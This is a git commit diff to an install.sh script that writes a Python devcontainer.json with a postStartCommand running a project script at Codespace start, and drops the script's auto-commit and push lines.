8f09af40ece76799eb4323974de057a66ec21470
zakky8 <shinojvb995@gmail.com>
2026-01-08 13:14:36 +0530

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,23 +1,20 @@
 mkdir -p .devcontainer
-cat <<EOL > .devcontainer/devcontainer.json
+
+cat <<'EOL' > .devcontainer/devcontainer.json
 {
-    "name": "My Codespace",
-    "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
-    "postStartCommand": "python /workspaces/venom-V5/main.py",
-    "customizations": {
-        "vscode": {
-            "settings": {
-                "python.pythonPath": "/usr/local/bin/python"
-            },
-            "extensions": [
-                "ms-python.python"
-            ]
-        }
+  "name": "My Codespace",
+  "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
+  "postStartCommand": "python3 /workspaces/new/m.py",
+  "customizations": {
+    "vscode": {
+      "settings": {
+        "python.pythonPath": "/usr/local/bin/python3"
+      },
+      "extensions": [
+        "ms-python.python"
+      ]
     }
+  }
 }
 EOL
-
-git add .devcontainer/devcontainer.json
-git commit -m "Add postStartCommand to run Python script automatically"
-git push origin main
 
